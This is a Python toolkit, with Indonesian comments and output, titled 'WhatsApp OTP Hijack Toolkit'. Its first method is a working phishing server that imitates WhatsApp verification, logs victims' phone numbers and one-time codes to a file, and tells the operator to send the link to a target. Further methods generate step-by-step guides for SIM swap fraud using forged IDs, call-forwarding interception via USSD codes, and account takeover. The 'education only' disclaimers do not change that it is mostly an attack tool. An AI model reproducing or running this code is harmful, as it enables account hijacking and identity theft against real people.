import os
import sys
import json
import time
import requests
import threading
import socket
import random
import hashlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote
import re
from datetime import datetime
import phonenumbers
from colorama import Fore, Style, init

init(autoreset=True)

class WhatsAppOTPAttack:
    def __init__(self):
        self.country_codes = {
            'ID': '+62',  # Indonesia
            'US': '+1',   # USA
            'IN': '+91',  # India
            'BR': '+55',  # Brazil
            'RU': '+7',   # Russia
            'DE': '+49',  # Germany
            'GB': '+44',  # UK
            'FR': '+33',  # France
        }
        
    def method_1_sms_phishing(self):
        print(Fore.YELLOW + "\n[METHOD 1] SMS Phishing for OTP")
        print(Fore.CYAN + "[*] Membuat server phishing OTP WhatsApp...")
        
        # Generate phishing page
        phishing_html = """<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #f0f2f5; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { color: #25D366; font-size: 40px; text-align: center; }
        h2 { text-align: center; color: #333; }
        .input-group { margin: 20px 0; }
        label { display: block; margin-bottom: 5px; color: #555; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        button { width: 100%; background: #25D366; color: white; border: none; padding: 14px; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1da851; }
        .note { background: #fff8e1; padding: 10px; border-radius: 5px; margin: 15px 0; font-size: 14px; }
        .error { color: red; text-align: center; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">WhatsApp</div>
        <h2>Verifikasi Nomor Telepon</h2>
        <p style="text-align: center; color: #666;">Masukkan kode verifikasi 6 digit yang dikirim via SMS</p>
        
        <form id="otpForm">
            <div class="input-group">
                <label for="phone">Nomor Telepon</label>
                <input type="tel" id="phone" name="phone" placeholder="+628123456789" required>
            </div>
            
            <div class="input-group">
                <label for="otp">Kode OTP</label>
                <input type="text" id="otp" name="otp" placeholder="123456" maxlength="6" required>
            </div>
            
            <div class="note">
                <strong>Perhatian:</strong> Kode OTP dikirim ke nomor telepon Anda via SMS. Jangan bagikan kode ini kepada siapapun.
            </div>
            
            <div id="errorMsg" class="error">Kode OTP salah. Coba lagi.</div>
            
            <button type="submit">Verifikasi</button>
        </form>
        
        <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #999;">
            Butuh bantuan? Hubungi dukungan WhatsApp.
        </p>
    </div>

    <script>
        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const otp = document.getElementById('otp').value;
            
            // Validasi sederhana
            if (!phone.startsWith('+')) {
                alert('Nomor telepon harus diawali dengan kode negara (contoh: +62)');
                return;
            }
            
            if (otp.length !== 6 || isNaN(otp)) {
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
            
            // Kirim data ke server
            fetch('/submit_otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phone: phone,
                    otp: otp,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Redirect ke halaman sukses
                    window.location.href = '/success?phone=' + encodeURIComponent(phone);
                } else {
                    document.getElementById('errorMsg').style.display = 'block';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan. Coba lagi.');
            });
        });
        
        // Auto-focus OTP input
        document.getElementById('otp').focus();
    </script>
</body>
</html>"""
        
        class OTPPhishingHandler(BaseHTTPRequestHandler):
            captured_data = []
            
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(phishing_html.encode())
                    
                elif self.path.startswith('/success'):
                    query = urlparse(self.path).query
                    params = parse_qs(query)
                    phone = params.get('phone', [''])[0]
                    
                    success_html = f"""
                    <!DOCTYPE html>
                    <html>
                    <head><title>Verifikasi Berhasil</title></head>
                    <body style="font-family: Arial; text-align: center; padding: 50px;">
                        <h1 style="color: #25D366;">✓ Verifikasi Berhasil</h1>
                        <p>Nomor {phone} telah terverifikasi.</p>
                        <p>WhatsApp akan segera diaktifkan.</p>
                        <p><small>Halaman demo untuk edukasi keamanan</small></p>
                    </body>
                    </html>
                    """
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(success_html.encode())
                    
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/submit_otp':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    data = json.loads(post_data.decode())
                    
                    # Simpan data yang dicapture
                    self.captured_data.append(data)
                    
                    # Log ke file
                    with open('captured_otp.log', 'a') as f:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"Time: {datetime.now()}\n")
                        f.write(f"Phone: {data['phone']}\n")
                        f.write(f"OTP: {data['otp']}\n")
                        f.write(f"User Agent: {data['userAgent']}\n")
                        f.write(f"Timestamp: {data['timestamp']}\n")
                    
                    print(Fore.GREEN + f"\n[+] OTP CAPTURED!")
                    print(Fore.CYAN + f"   Phone: {data['phone']}")
                    print(Fore.CYAN + f"   OTP: {data['otp']}")
                    print(Fore.YELLOW + f"   Saved to: captured_otp.log")
                    
                    # Kirim response
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    response = json.dumps({'success': True})
                    self.wfile.write(response.encode())
            
            def log_message(self, format, *args):
                pass
        
        port = 9999
        server = HTTPServer(('0.0.0.0', port), OTPPhishingHandler)
        
        print(Fore.GREEN + f"[+] Phishing server running on port {port}")
        print(Fore.CYAN + f"[*] Di Codespace: https://{os.environ.get('CODESPACE_NAME', 'localhost')}-{port}.app.github.dev")
        print(Fore.YELLOW + "[!] Kirim link ini ke target: 'Verifikasi WhatsApp Anda'")
        print(Fore.RED + "[!] Target harus memasukkan nomor dan OTP yang diterima via SMS")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[*] Server stopped")
            server.server_close()
    
    def method_2_sim_swap_social(self):
        print(Fore.YELLOW + "\n[METHOD 2] SIM Swap Social Engineering")
        print(Fore.CYAN + "[*] Membuat script social engineering...")
        
        script = """
# SIM SWAP SOCIAL ENGINEERING SCRIPT
# Hanya untuk edukasi keamanan

import random
import time

def generate_attack_script(target_number, carrier):
    carriers = {
        'telkomsel': ['*363#', '0811 111 363'],
        'xl': ['*123#', '0817 157 157'],
        'indosat': ['*123#', '0816 154 123'],
        'three': ['*111#', '0896 9999 111'],
        'smartfren': ['*995#', '0881 401 995']
    }
    
    carrier_info = carriers.get(carrier.lower(), ['*xxx#', 'customer service'])
    
    script = f'''
=== SIM SWAP SOCIAL ENGINEERING SCRIPT ===
Target: {target_number}
Carrier: {carrier.upper()}

Tahap 1: Pengumpulan Informasi
1. Cari informasi target di media sosial:
   - Tanggal lahir
   - Nama ibu kandung
   - Alamat email
   - Alamat rumah

2. Hubungi customer service {carrier}:
   - Telepon: {carrier_info[1]}
   - USSD: {carrier_info[0]}

Tahap 2: Persiapan
1. Siapkan dokumen palsu (jika perlu):
   - KTP scan (edit Photoshop)
   - Surat kehilangan SIM

2. Siapkan alasan:
   - "SIM card hilang"
   - "HP hilang/dicuri"
   - "Ingin ganti kartu ke 4G/5G"

Tahap 3: Eksekusi
1. Hubungi customer service:
   - "Halo, saya kehilangan SIM card {target_number}"
   - "Bisa bantu untuk ganti kartu SIM?"
   
2. Berikan data yang sudah dikumpulkan

Tahap 4: Post-Action
1. Setelah dapat SIM baru:
   - Registrasi WhatsApp dengan nomor {target_number}
   - OTP akan dikirim ke SIM baru
   - Akun WhatsApp target akan pindah ke device kamu

PERINGATAN: 
- Ini adalah kejahatan serius (pencurian identitas)
- Hukuman penjara panjang
- Untuk edukasi keamanan saja
'''
    
    return script

# Contoh penggunaan
if __name__ == "__main__":
    print(generate_attack_script("+628123456789", "telkomsel"))
    
    print("\\n[!] INI ADALAH KEJAHATAN SIBER!")
    print("[!] JANGAN LAKUKAN KECUALI UNTUK PENTEST DENGAN IZIN!")
"""
        
        with open('sim_swap_attack.py', 'w') as f:
            f.write(script)
        
        print(Fore.GREEN + "[+] Script created: sim_swap_attack.py")
        print(Fore.RED + "[!] PERINGATAN: SIM swap adalah kejahatan serius!")
    
    def method_3_otp_bruteforce_sim(self):
        print(Fore.YELLOW + "\n[METHOD 3] OTP Brute-force Simulation")
        print(Fore.CYAN + "[*] WhatsApp OTP adalah 6 digit...")
        
        bruteforce_sim = """
import itertools
import time
import hashlib

def simulate_otp_cracking():
    # WhatsApp OTP adalah 6 digit angka (000000 - 999999)
    total_possibilities = 10**6  # 1,000,000
    otp_to_crack = "123456"  # Contoh OTP
    
    print(f"Total kemungkinan OTP 6-digit: {total_possibilities:,}")
    print(f"OTP target: {otp_to_crack}")
    print("\\n[!] Dalam realita, WhatsApp rate-limits OTP attempts")
    print("[!] Maksimal 3-5 percobaan sebelum diblokir")
    print("[!] Brute-force tidak praktis untuk WhatsApp")
    
    # Simulasi brute-force (hitung waktu saja)
    attempts_per_second = 1  # WhatsApp blokir setelah beberapa attempt
    time_needed = total_possibilities / attempts_per_second
    time_needed_days = time_needed / (24 * 3600)
    
    print(f"\\nWaktu yang dibutuhkan (1 attempt/detik):")
    print(f"  {time_needed_days:,.0f} hari")
    print(f"  {time_needed_days/365:,.1f} tahun")
    
    # Metode praktis: social engineering
    print("\\n=== METODE PRACTICAL ===")
    print("1. Phishing: Buat halaman login WhatsApp palsu")
    print("2. SIM Swap: Social engineering ke operator")
    print("3. Malware: Keylogger/OTP stealer di HP target")
    print("4. SS7 Exploit: Intercept SMS di level jaringan (advanced)")
    
    return False

def check_otp_vulnerabilities():
    vulnerabilities = [
        {
            "name": "Weak OTP Storage",
            "description": "OTP disimpan di SMS inbox tanpa enkripsi",
            "exploit": "Akses fisik ke HP, backup SMS, cloud sync"
        },
        {
            "name": "SIM Swap",
            "description": "Nomor pindah ke SIM attacker",
            "exploit": "Social engineering ke operator"
        },
        {
            "name": "Phishing",
            "description": "Halaman login palsu",
            "exploit": "Kirim link phishing ke target"
        },
        {
            "name": "Malware",
            "description": "Trojan di HP target",
            "exploit": "Install malware via link/APK"
        }
    ]
    
    print("\\n=== OTP VULNERABILITIES ===")
    for vuln in vulnerabilities:
        print(f"\\n[{vuln['name']}]")
        print(f"Desc: {vuln['description']}")
        print(f"Exploit: {vuln['exploit']}")
    
    return vulnerabilities

if __name__ == "__main__":
    simulate_otp_cracking()
    check_otp_vulnerabilities()
    print("\\n[!] INI HANYA SIMULASI EDUKASI!")
    print("[!] JANGAN COBA DI AKUN ORANG LAIN!")
"""
        
        with open('otp_bruteforce.py', 'w') as f:
            f.write(bruteforce_sim)
        
        print(Fore.GREEN + "[+] OTP analysis created: otp_bruteforce.py")
    
    def method_4_call_forwarding_attack(self):
        print(Fore.YELLOW + "\n[METHOD 4] Call Forwarding Attack")
        print(Fore.CYAN + "[*] WhatsApp bisa verifikasi via telepon...")
        
        call_attack = """
# CALL FORWARDING/SMS FORWARDING ATTACK
# WhatsApp alternative: voice call verification

import re

class CallForwardingAttack:
    def __init__(self):
        self.ussd_codes = {
            'telkomsel': {
                'forward_all': '*21*{target}#',
                'forward_when_busy': '*67*{target}#',
                'forward_when_unreachable': '*62*{target}#',
                'cancel': '#21#',
            },
            'xl': {
                'forward': '*72{target}',
                'cancel': '*720'
            },
            'indosat': {
                'forward': '*72*{target}#',
                'cancel': '*720#'
            }
        }
    
    def generate_attack_plan(self, target_number, attacker_number, carrier):
        plan = f'''
=== CALL FORWARDING ATTACK PLAN ===
Target: {target_number}
Attacker: {attacker_number}
Carrier: {carrier}

Tujuan: Forward semua panggilan/SMS dari target ke attacker

Langkah 1: Akses fisik ke HP target (beberapa menit saja)
Langkah 2: Aktifkan call forwarding:
'''
        
        codes = self.ussd_codes.get(carrier.lower(), {})
        if codes:
            for name, code in codes.items():
                if '{target}' in code:
                    filled_code = code.format(target=attacker_number)
                    plan += f"  {name}: Dial {filled_code}\\n"
        
        plan += '''
Langkah 3: Untuk WhatsApp:
1. Di HP attacker, buka WhatsApp
2. Pilih "Verify via phone call"
3. WhatsApp akan menelepon ke target number
4. Karena call forwarding aktif, panggilan dialihkan ke attacker
5. Attacker dapat kode verifikasi via telepon

Langkah 4: Setelah berhasil, nonaktifkan forwarding:
'''
        
        if 'cancel' in codes:
            plan += f"  Dial {codes['cancel']}\\n"
        
        plan += '''
PERINGATAN:
- Membutuhkan akses fisik ke HP target
- Aktivitas ilegal (unauthorized access)
- Hanya untuk edukasi keamanan
'''
        
        return plan

# Contoh
if __name__ == "__main__":
    attack = CallForwardingAttack()
    print(attack.generate_attack_plan("+628123456789", "+628987654321", "telkomsel"))
    print("\\n[!] UNTUK EDUKASI KEAMANAN SAJA!")
    print("[!] JANGAN LAKUKAN TANPA IZIN!")
"""
        
        with open('call_forwarding.py', 'w') as f:
            f.write(call_attack)
        
        print(Fore.GREEN + "[+] Call attack script: call_forwarding.py")
    
    def method_5_whatsapp_api_otp(self):
        print(Fore.YELLOW + "\n[METHOD 5] WhatsApp API OTP Request")
        print(Fore.CYAN + "[*] Simulasi request OTP ke WhatsApp API...")
        
        api_simulator = """
import requests
import json
import time
import random

class WhatsAppAPISimulator:
    def __init__(self):
        # Ini adalah endpoint WhatsApp untuk request OTP
        # (Diambil dari penelitian security)
        self.endpoints = {
            'request_otp': 'https://web.whatsapp.com/otp',
            'verify_otp': 'https://web.whatsapp.com/verify',
            'register': 'https://web.whatsapp.com/register'
        }
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://web.whatsapp.com',
            'Referer': 'https://web.whatsapp.com/'
        }
    
    def simulate_otp_request(self, phone_number):
        '''Simulasi request OTP ke WhatsApp'''
        
        print(f"\\n[*] Simulating OTP request for: {phone_number}")
        
        # Data yang biasanya dikirim
        request_data = {
            'cc': phone_number[:3],  # country code
            'in': phone_number[3:],   # phone number tanpa country code
            'lc': 'ID',               # locale
            'lg': 'id',               # language
            'method': 'sms',          # or 'voice'
            'sim_mcc': '510',         # mobile country code
            'sim_mnc': '10',          # mobile network code
            'id': self.generate_device_id(),
            'token': self.generate_token()
        }
        
        print("[*] Request data structure:")
        for key, value in request_data.items():
            print(f"  {key}: {value}")
        
        print("\\n[!] Dalam realita, WhatsApp akan:")
        print("  1. Kirim OTP via SMS ke nomor tersebut")
        print("  2. OTP valid 10-15 menit")
        print("  3. Rate limiting: max 3-5 request per hari")
        print("  4. Block jika suspicious activity terdeteksi")
        
        return request_data
    
    def simulate_otp_verification(self, phone_number, otp):
        '''Simulasi verifikasi OTP'''
        
        print(f"\\n[*] Simulating OTP verification")
        print(f"  Phone: {phone_number}")
        print(f"  OTP: {otp}")
        
        verification_data = {
            'cc': phone_number[:3],
            'in': phone_number[3:],
            'otp': otp,
            'token': self.generate_token(),
            'id': self.generate_device_id()
        }
        
        print("[*] Jika OTP benar, WhatsApp akan:")
        print("  1. Generate session keys")
        print("  2. Sync kontak dan chat history")
        print("  3. Login berhasil di device baru")
        
        # Simulasi response
        simulated_response = {
            'status': 'success',
            'login': phone_number,
            'server_token': 'simulated_token_' + str(random.randint(100000, 999999)),
            'push_token': 'simulated_push_' + str(random.randint(100000, 999999)),
            'security': 'end-to-end encrypted',
            'expires': int(time.time()) + 2592000  # 30 hari
        }
        
        print("\\n[*] Simulated successful response:")
        for key, value in simulated_response.items():
            print(f"  {key}: {value}")
        
        return simulated_response
    
    def generate_device_id(self):
        '''Generate random device ID'''
        import uuid
        return str(uuid.uuid4()).replace('-', '')[:20]
    
    def generate_token(self):
        '''Generate random token'''
        import secrets
        return secrets.token_hex(16)
    
    def security_measures(self):
        '''WhatsApp security measures'''
        measures = [
            "Rate limiting OTP requests",
            "Device fingerprinting",
            "Suspicious activity detection",
            "Two-step verification (optional)",
            "End-to-end encryption",
            "Block after multiple failed attempts",
            "IP address monitoring"
        ]
        
        print("\\n=== WHATSAPP SECURITY MEASURES ===")
        for i, measure in enumerate(measures, 1):
            print(f"{i}. {measure}")
        
        return measures

# Contoh penggunaan
if __name__ == "__main__":
    simulator = WhatsAppAPISimulator()
    
    # Simulasi request OTP
    simulator.simulate_otp_request("+628123456789")
    
    # Simulasi verifikasi
    simulator.simulate_otp_verification("+628123456789", "123456")
    
    # Security measures
    simulator.security_measures()
    
    print("\\n" + "="*60)
    print("[!] PERHATIAN: Ini hanya simulasi untuk edukasi")
    print("[!] Jangan coba request OTP ke nomor orang lain!")
    print("[!] WhatsApp akan mendeteksi dan memblokir abuse!")
"""
        
        with open('whatsapp_api_sim.py', 'w') as f:
            f.write(api_simulator)
        
        print(Fore.GREEN + "[+] API simulator: whatsapp_api_sim.py")
    
    def create_combined_attack(self):
        print(Fore.YELLOW + "\n[+] Creating comprehensive attack guide...")
        
        guide = f"""
# COMPREHENSIVE WHATSAPP OTP HIJACK GUIDE
# Untuk edukasi keamanan - Jangan disalahgunakan
# Generated: {datetime.now()}

## METODE-METODE OTP HIJACKING:

### 1. PHISHING (Paling Umum)
- Buat halaman login WhatsApp palsu
- Kirim link ke target: "WhatsApp Anda perlu verifikasi ulang"
- Target masuk nomor, OTP dikirim ke HP target
- Target input OTP ke halaman phishing -> OTP dicapture
- Attacker gunakan OTP untuk login

### 2. SIM SWAP (Paling Berbahaya)
- Social engineering ke operator seluler
- Pindahkan nomor target ke SIM card attacker
- Semua SMS/telepon dialihkan ke attacker
- Request OTP WhatsApp -> ke HP attacker
- Full take over akun WhatsApp

### 3. MALWARE (Technical)
- Install malware di HP target (via link/APK)
- Malware membaca SMS inbox (OTP)
- Kirim OTP ke server attacker
- Attacker gunakan OTP real-time

### 4. CALL FORWARDING
- Akses fisik ke HP target (beberapa menit)
- Aktifkan call forwarding ke nomor attacker
- WhatsApp "verify via call" -> telepon ke attacker
- Attacker dapat kode via telepon

### 5. SS7 EXPLOIT (Advanced)
- Exploit vulnerability di jaringan telekomunikasi SS7
- Intercept SMS di level jaringan operator
- Tidak perlu akses ke HP target
- Hanya untuk state-level attackers

## PERTAHANAN:
1. Aktifkan Two-Step Verification di WhatsApp
2. Jangan bagikan OTP ke siapapun
3. Hati-hati dengan link verifikasi
4. Monitor aktivitas SIM card
5. Gunakan authenticator app, bukan SMS OTP

## PERINGATAN:
- Aktivitas ini ILEGAL
- Hukuman penjara 5-10 tahun
- Kerugian materi dan reputasi
- Hanya untuk edukasi keamanan dan pentest dengan izin
"""
        
        with open('WHATSAPP_OTP_ATTACK_GUIDE.txt', 'w') as f:
            f.write(guide)
        
        print(Fore.GREEN + "[+] Guide created: WHATSAPP_OTP_ATTACK_GUIDE.txt")
    
    def run_menu(self):
        print(Fore.RED + "\n" + "="*70)
        print(Fore.RED + "WHATSAPP OTP HIJACK TOOLKIT - NO QR CODE REQUIRED")
        print(Fore.RED + "="*70)
        print(Fore.YELLOW + "\n[!] PERINGATAN KERAS: UNTUK EDUKASI KEAMANAN SAJA!")
        print(Fore.YELLOW + "[!] JANGAN GUNAKAN UNTUK KEJAHATAN!\n")
        
        methods = {
            '1': ("SMS Phishing Server", self.method_1_sms_phishing),
            '2': ("SIM Swap Social Engineering", self.method_2_sim_swap_social),
            '3': ("OTP Brute-force Analysis", self.method_3_otp_bruteforce_sim),
            '4': ("Call Forwarding Attack", self.method_4_call_forwarding_attack),
            '5': ("WhatsApp API Simulation", self.method_5_whatsapp_api_otp),
            '6': ("Create Comprehensive Guide", self.create_combined_attack),
            '0': ("Exit", None)
        }
        
        while True:
            print(Fore.CYAN + "\nAvailable Methods:")
            for key, (name, _) in methods.items():
                if key != '0':
                    print(Fore.YELLOW + f"  [{key}] {name}")
            print(Fore.WHITE + "  [0] Exit")
            print(Fore.GREEN + "-"*50)
            
            choice = input(Fore.CYAN + "\nSelect method: " + Fore.WHITE).strip()
            
            if choice == '0':
                print(Fore.YELLOW + "[*] Exiting...")
                break
            elif choice in methods:
                if methods[choice][1]:
                    methods[choice][1]()
            else:
                print(Fore.RED + "[!] Invalid choice")

def main():
    print(Fore.RED + "\n[!] PERHATIAN: Tool ini hanya untuk edukasi keamanan siber!")
    print(Fore.RED + "[!] WhatsApp OTP hijacking adalah kejahatan serius!")
    print(Fore.YELLOW + "[*] Tool ini hanya menunjukkan metode untuk awareness\n")
    
    time.sleep(2)
    
    toolkit = WhatsAppOTPAttack()
    toolkit.run_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[*] Program terminated")
    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}")